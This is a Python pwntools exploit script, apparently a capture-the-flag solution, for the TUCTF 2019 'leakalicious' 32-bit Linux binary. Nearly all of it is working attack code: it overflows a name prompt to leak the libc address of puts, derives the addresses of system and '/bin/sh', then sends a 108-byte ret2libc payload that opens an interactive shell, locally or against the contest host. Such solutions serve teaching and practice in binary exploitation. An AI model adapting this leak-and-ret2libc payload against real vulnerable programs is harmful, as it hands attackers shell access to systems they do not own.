#!/usr/bin/env python2
'''
    author : tripoloski 
    visit  : https://tripoloski1337.github.io/
    mail   : arsalan.dp@gmail.com
    generated by skeloski GEF
'''
import sys
from pwn import *
context.update(arch="i386", endian="little", os="linux", log_level="debug",)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/tripoloski/code/ctf/tuCTF-2019/pwn/leakalicious/leakalicious")
elf = ELF(TARGET)

libc = ELF("libc6_2.23-0ubuntu10_i386/libc.so.6")

def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def exploit(r):
    # attach(r)
    #                       +-> puts@libc
    # notes                 |
    # 0xffffd0d0: 0x4e414c41| 0xffffd10a  0xffffd19c  0x565562ab
    # 0xffffd0e0: 0xf7fe59b0| 0x00000000  0x56556299  0x00000000
    # 0xffffd0f0: 0xf7e23b40+ 0x00000000  0x00000000  0xf7dd4e81
    # 0xffffd100: 0x00000001  0xffffd194  0xffffd19c  0xffffd124
    # 0xffffd110: 0x00000001  0x00000000  0xf7f94000  0xf7fe575a
    # 0xffffd120: 0xf7ffd000  0x00000000  0xf7f94000  0x00000000
    # 0xffffd130: 0x00000000  0x7139c6e9  0x340740f9  0x00000000
    # 0xffffd140: 0x00000000  0x00000000  0x00000001  0x56556080
    # 0xffffd150: 0x00000000  0xf7feae20  0xf7fe59b0  0x56559000 -> base pie
    # 0xffffd160: 0x00000001  0x56556080  0x00000000  0x565560b1

    # leaklibc 
    p = "A" * 31 + ":"
    r.sendafter("handle?\n",p)
    r.recvuntil(":")
    leak_libc = u32(r.recv(4))
    log.info("leak libc : " + hex(leak_libc))
    
    # libc_system = leak_libc + 0x0003ada0
    # libc_binsh  = leak_libc + 0x15ba0b
    
    libc_base   = leak_libc - libc.symbols['puts']
    libc_system = libc_base + libc.symbols['system']
    libc_binsh  = libc_base + libc.search("/bin/sh").next()
    log.info("libc base   : " + hex(libc_base))

    log.info("libc system : " + hex(libc_system))
    log.info("/bin/sh     : " + hex(libc_binsh))

    q = "A" * 108
    q += p32(libc_system)
    q += p32(0)
    q += p32(libc_binsh)
    r.sendafter("exploit?\n",q)

    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("chal.tuctf.com", 30505)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)
